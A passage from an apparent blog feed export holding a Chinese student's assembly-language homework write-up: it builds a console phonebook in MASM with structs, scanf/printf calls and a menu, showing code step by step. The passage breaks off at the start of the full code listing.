target="_blank" rel="external nofollow noopener noreferrer">https://baike.baidu.com/item/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7/4752611#3</a></p><p>​    </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href></a></li><li><a href></a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C语言基础01–初见C语言&quot;&gt;&lt;a href=&quot;#C语言基础01–初见C语言&quot; class=&quot;headerlink&quot; title=&quot;C语言基础01–初见C语言&quot;&gt;&lt;/a&gt;C语言基础01–初见C语言&lt;/h1&gt;&lt;h3 id=&quot;常见函数&quot;&gt;&lt;a href=&quot;#常见函数&quot;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="C语言学习笔记" scheme="http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编作业--电话簿</title>
    <link href="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A--%E7%94%B5%E8%AF%9D%E7%B0%BF/"/>
    <id>http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A--%E7%94%B5%E8%AF%9D%E7%B0%BF/</id>
    <published>2020-05-14T15:27:19.000Z</published>
    <updated>2020-05-14T16:49:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="汇编作业–电话簿"><a href="#汇编作业–电话簿" class="headerlink" title="汇编作业–电话簿"></a>汇编作业–电话簿</h1><p>花了不少时间，不过总算完成这项作业了，虽然不是很完美，但也基本符合要求了，完成过程跟大家分享分享，</p><p>个人博客：<a href="https://kn0sky.com">https://kn0sky.com</a></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**项目名称：**</span>汇编语言电话本</span><br><span class="line"></span><br><span class="line"><span class="strong">**项目背景：**</span>基于同学们学习汇编语言后没有练习的问题，特以该项目作为阶段性练习。</span><br><span class="line"></span><br><span class="line"><span class="strong">**项目目的：**</span>熟悉汇编语言编程，练习编程逻辑，熟悉Win32 API调用模式</span><br><span class="line"></span><br><span class="line"><span class="strong">**项目要求：**</span>编写一个具有增删改查功能的电话本，基于控制台。具体要求如下：</span><br><span class="line"></span><br><span class="line"><span class="bullet">1. </span>基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储</span><br><span class="line"><span class="bullet">2. </span>增加功能：插入姓名与电话号码到数据结构的最后。</span><br><span class="line"><span class="bullet">3. </span>查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。</span><br><span class="line"><span class="bullet">4. </span>删除功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，且删除该条信息。</span><br><span class="line"><span class="bullet">5. </span>修改功能：输入姓名或电话号码，以此作为依据，到数据结构中查找，找到后打印信息，要求输入新的姓名或电话，接受后修改原有条目。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="strong">**编写指南：**</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**1.**</span><span class="strong">**数组的编写方式**</span></span><br><span class="line"></span><br><span class="line">TelephoneNumber dd 30 DUP(?)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="strong">**2.**</span><span class="strong">**结构体的编写方式**</span></span><br><span class="line"></span><br><span class="line">Name STRUCT</span><br><span class="line"></span><br><span class="line">具体成员信息</span><br><span class="line"></span><br><span class="line">Name ENDS</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="strong">**3.**</span><span class="strong">**控制台相关的API**</span></span><br><span class="line"></span><br><span class="line">GetStdHandle 获得标准输入输出的窗口句柄</span><br><span class="line"></span><br><span class="line">SetConsoleTextAttribute是设置控制台字体颜色和背景色</span><br><span class="line"></span><br><span class="line">CONSOLE<span class="emphasis">_CURSOR_</span>INFO用于存放控制光标信息</span><br><span class="line"></span><br><span class="line">SetConsoleCursorInfo设置光标的信息</span><br><span class="line"></span><br><span class="line">GetConsoleScreenBufferInfo取得控制台屏幕信息</span><br><span class="line"></span><br><span class="line">SetConsoleCursorPosition设置光标位置</span><br><span class="line"></span><br><span class="line">WriteConsoleOutput直接写输入缓冲区</span><br><span class="line"></span><br><span class="line">SetConsoleTitle设置控制台的标题</span><br><span class="line"></span><br><span class="line">ReadConsole 读控制台</span><br><span class="line"></span><br><span class="line">WriteConsole 写控制台</span><br></pre></td></tr></table></figure><h2 id="实现基本功能"><a href="#实现基本功能" class="headerlink" title="实现基本功能"></a>实现基本功能</h2><p>首先，根据前面所学的知识不能够完成本项目，目前以本项目为最终目标，将目标分解成小目标逐个击破</p><p>第一步———-基本功能：电话本具有姓名与电话号码两项属性，并且使用数据结构作为存储</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>首先要了解数据结构要怎么弄，我们的数据包括姓名和电话两部分，姓名是字符串，电话是数组，应该先弄清楚这两样东西怎么用</p><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>定义一个字符串并通过调用消息框输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat,stdcall</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line">MessageBoxA PROTO, hWnd:DWORD ,lpText:BYTE ,lpCaption:BYTE ,uType:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">name1 db &quot;警告&quot; ,0</span><br><span class="line">name2 db &quot;你菜爆了&quot; ,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">push 0</span><br><span class="line">lea eax ,name1</span><br><span class="line">push eax</span><br><span class="line">lea eax ,name2</span><br><span class="line">push eax</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA</span><br><span class="line">add esp,16</span><br><span class="line">call ExitProcess</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p>通过控制台输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat, stdcall</span><br><span class="line"></span><br><span class="line">include msvcrt.inc</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">    szText db &#39;Hello World!&#39;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">    invoke crt_printf, addr szText;类似于call，但比call方便，可直接在后面跟参数</span><br><span class="line">    mov eax ,eax</span><br><span class="line">main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>定义一个数组赋值并输出到控制台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line"></span><br><span class="line">include msvcrt.inc</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">;定义数组</span><br><span class="line">user db 20 dup(0)</span><br><span class="line">testext db &quot;hello world!&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">;给数组赋值</span><br><span class="line">lea edi ,offset user</span><br><span class="line">lea esi ,offset testext</span><br><span class="line">    mov ecx,20</span><br><span class="line">rep movsb</span><br><span class="line">;打印</span><br><span class="line">push offset user</span><br><span class="line">call crt_printf</span><br><span class="line"></span><br><span class="line">mov eax ,eax</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h4 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h4><p>到这里我们已经会使用字符串和数组了，接下来了解一下如何使用数据结构作为存储。</p><p>示例：创建一个结构体，包含两项内容，插入值并输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line"></span><br><span class="line">include msvcrt.inc</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">;定义结构体</span><br><span class="line">Contact struct</span><br><span class="line">user db 20 dup(0)</span><br><span class="line">tel db 20 dup(0)</span><br><span class="line">Contact ends</span><br><span class="line"></span><br><span class="line">person1 Contact &lt;&gt;</span><br><span class="line">person2 Contact &lt;&#39;john&#39;,&#39;12312312312&#39;&gt;</span><br><span class="line"></span><br><span class="line">tsname db &quot;Li Hua&quot;,0</span><br><span class="line">tstel db &quot;12312345678&quot;,0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">;给结构体数组赋值</span><br><span class="line">lea edi ,offset person1.tel</span><br><span class="line">lea esi ,offset tstel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">lea edi ,offset person1.user</span><br><span class="line">lea esi ,offset tsname</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">push offset person1.user</span><br><span class="line">call crt_printf</span><br><span class="line">add esp ,4</span><br><span class="line"></span><br><span class="line">push offset person1.tel</span><br><span class="line">call crt_printf</span><br><span class="line">add esp ,4</span><br><span class="line"></span><br><span class="line">mov eax ,eax</span><br><span class="line"></span><br><span class="line">main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><p>到此，基本功能已经实现，下一步，实现增加功能</p><h2 id="实现增加功能"><a href="#实现增加功能" class="headerlink" title="实现增加功能"></a>实现增加功能</h2><p>增加功能：插入姓名与电话号码到数据结构的最后。</p><p>这里要解决两个问题</p><ol><li>如何输入数据</li><li>如何将数据加到数据结构的最后</li></ol><h3 id="输入功能"><a href="#输入功能" class="headerlink" title="输入功能"></a>输入功能</h3><p>输入一个字符数并输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.model flat ,stdcall</span><br><span class="line"></span><br><span class="line">include msvcrt.inc</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">;输入格式</span><br><span class="line">input_format_str db &quot;%s&quot;,0</span><br><span class="line"></span><br><span class="line">;存放输入的变量</span><br><span class="line">inputstr db 0,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf;输入函数需要两个参数，一个是输入格式，一个用来保存输入的值</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">invoke crt_printf ,offset inputstr</span><br><span class="line"></span><br><span class="line">mov eax ,eax</span><br><span class="line">main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3 id="添加数据函数"><a href="#添加数据函数" class="headerlink" title="添加数据函数"></a>添加数据函数</h3><p>据此，我们可以用一个变量来计数，来计算数组最后一个位置的偏移量，通过上面的方法来实现添加数据。</p><p>初步完成添加数据功能函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">;结构体存储名字电话</span><br><span class="line">Contact struct</span><br><span class="line">user db 20 dup(0)</span><br><span class="line">tel db 20 dup(0)</span><br><span class="line">Contact ends</span><br><span class="line"></span><br><span class="line">;定义一个结构体数组存储所有联系人</span><br><span class="line">ContactList Contact 100 dup(&lt;&#39;0&#39;&gt;)</span><br><span class="line"></span><br><span class="line">;定义一个临时结构用来传送数据</span><br><span class="line">tmpContact Contact &lt;&#39;john&#39;,&#39;123123123123&#39;&gt;</span><br><span class="line"></span><br><span class="line">;输入格式</span><br><span class="line">input_format_str db &quot;%s&quot;,0</span><br><span class="line"></span><br><span class="line">;存放输入的变量</span><br><span class="line">inputstr db 20 dup(0)</span><br><span class="line"></span><br><span class="line">;现有数据数</span><br><span class="line">count dd 1 dup(0)</span><br><span class="line"></span><br><span class="line">;问候语</span><br><span class="line">input_user_text db &quot;请输入联系人姓名：&quot;,0</span><br><span class="line">input_tel_text db &quot;请输入联系人电话：&quot;,0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">addContact proc</span><br><span class="line">;消息提示1：请输入联系人姓名</span><br><span class="line">push offset input_user_text</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.user</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;----------------------------------------</span><br><span class="line"></span><br><span class="line">;消息提示2：请输入联系人电话</span><br><span class="line">push offset input_tel_text</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line"></span><br><span class="line">;输入</span><br><span class="line">push offset inputstr</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line"></span><br><span class="line">;保存到临时用结构里</span><br><span class="line">lea esi ,offset inputstr</span><br><span class="line">lea edi ,offset tmpContact.tel</span><br><span class="line">mov ecx ,20</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;-----------------------------------------</span><br><span class="line"></span><br><span class="line">;保存到数据结构的最后</span><br><span class="line">lea esi ,offset tmpContact</span><br><span class="line">lea edi ,offset ContactList</span><br><span class="line"></span><br><span class="line">;计算偏移,并移动</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">mov ecx ,count</span><br><span class="line">imul eax,ecx</span><br><span class="line">add edi ,eax</span><br><span class="line">mov ecx ,40</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">;总数+1</span><br><span class="line">inc count</span><br><span class="line"></span><br><span class="line">;返回</span><br><span class="line">retn</span><br><span class="line">addContact endp</span><br></pre></td></tr></table></figure><h2 id="实现查询功能"><a href="#实现查询功能" class="headerlink" title="实现查询功能"></a>实现查询功能</h2><p>查询功能：输入姓名，以此作为依据，到数据结构中查找，将找到的信息打印到控制台。</p><p>这里思路就很简单了，我们把我们的联系人数组遍历一遍即可，ebx来接收要循环的次数，edx显示当前已循环的次数，如果到循环次数了，也就是遍历到联系人总数了，就结束循环跳出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">searchContact proc</span><br><span class="line">mov edx ,0</span><br><span class="line">mov ebx ,count</span><br><span class="line">l:</span><br><span class="line">;判断循环条件</span><br><span class="line">cmp edx ,ebx</span><br><span class="line">jz exit;edx&#x3D;&#x3D;ebx的时候退出</span><br><span class="line"></span><br><span class="line">;获取数组地址</span><br><span class="line">lea esi ,offset ContactList</span><br><span class="line">lea edi ,offset s_test_user;临时用待查询人姓名</span><br><span class="line"></span><br><span class="line">;计算偏移量来选择数组的下一位</span><br><span class="line">mov eax ,sizeof(Contact)</span><br><span class="line">imul eax,edx</span><br><span class="line">add esi ,eax</span><br><span class="line"></span><br><span class="line">;串比较</span><br><span class="line">mov ecx ,20</span><br><span class="line">repe cmpsb</span><br><span class="line"></span><br><span class="line">;比较成功了，跳转到s程序，将查询到的信息打印出来</span><br><span class="line">jz s</span><br><span class="line"></span><br><span class="line">;比较失败了，edx+1，然后继续查询</span><br><span class="line">inc edx</span><br><span class="line">jnz l</span><br><span class="line">s:</span><br><span class="line">;edx+1，然后ebx，edx入栈出栈</span><br><span class="line">inc edx</span><br><span class="line">push edx</span><br><span class="line">push ebx</span><br><span class="line">;invoke会改变ebx，edx的内容</span><br><span class="line">invoke crt_printf ,offset s_test_user</span><br><span class="line">pop ebx</span><br><span class="line">pop edx</span><br><span class="line">;然后无条件跳转回循环中继续下一次查询</span><br><span class="line">jmp l</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">retn</span><br><span class="line"></span><br><span class="line">searchContact endp</span><br></pre></td></tr></table></figure><h2 id="增加一个菜单功能"><a href="#增加一个菜单功能" class="headerlink" title="增加一个菜单功能"></a>增加一个菜单功能</h2><p>已经实现几个功能了，接下来我们可以新增一下菜单功能，让我们的操作看起来更直接一些</p><p>思路很简单，就是接收一个输入的值，如果值等于1就走1选项，以此类推即可,这里给出一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">;菜单</span><br><span class="line">bookmenu db &quot;电话簿（Console版）v0.1&quot;,endl,</span><br><span class="line">&quot;1. 添加数据&quot;,endl,</span><br><span class="line">&quot;2. 查询数据&quot;,endl,</span><br><span class="line">&quot;3. 修改数据&quot;,endl,</span><br><span class="line">&quot;4. 删除数据&quot;,endl,</span><br><span class="line">&quot;5. 添加测试用数据&quot;,endl,</span><br><span class="line">&quot;6. 退出程序&quot;,endl,</span><br><span class="line">&quot;请输入选项:&quot;,0</span><br><span class="line"></span><br><span class="line">choose db 1 dup(0)</span><br><span class="line"></span><br><span class="line">chooselist db &quot; 123456&quot;,0</span><br><span class="line">.code</span><br><span class="line">menu:</span><br><span class="line">;显示菜单</span><br><span class="line">push offset bookmenu</span><br><span class="line">call crt_printf</span><br><span class="line">add esp ,4</span><br><span class="line"></span><br><span class="line">;输入选项</span><br><span class="line">push offset choose</span><br><span class="line">push offset input_format_str</span><br><span class="line">call crt_scanf</span><br><span class="line"></span><br><span class="line">;jcc跳转</span><br><span class="line">mov ebx ,1</span><br><span class="line"></span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c1</span><br><span class="line">inc ebx</span><br><span class="line">;此处省略c2--c5</span><br><span class="line">mov esi ,offset chooselist</span><br><span class="line">mov edi ,offset choose</span><br><span class="line">add esi ,ebx</span><br><span class="line">mov ecx ,1</span><br><span class="line">repe cmpsb</span><br><span class="line">jz c6</span><br><span class="line">jmp menu</span><br><span class="line">c1:</span><br><span class="line">inc ebx</span><br><span class="line">call addContact</span><br><span class="line">jmp menu</span><br><span class="line">c6:</span><br><span class="line">call ExitProcess</span><br></pre></td></tr></table></figure><h2 id="实现修改-删除功能"><a href="#实现修改-删除功能" class="headerlink" title="实现修改/删除功能"></a>实现修改/删除功能</h2><p>这里就讲个思路，方法与前面大同小异</p><p>修改/删除功能是在查询功能的基础之上新增的功能，设置一个修改flag=0，如果从菜单选中修改/删除，则flag=1，思路是通过查询函数查到数据之后，检查flag的值，如果flag=1，则进行修改/删除</p><p>删除操作其实就是把要删除的那一个部分用后面的内容覆盖掉就行了</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="image-20200514230142334.png" alt="image-20200514230142334"></p><p><img src="image-20200514230655653.png" alt="image-20200514230655653"></p><p><img src="image-20200514230749576.png" alt="image-20200514230749576"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 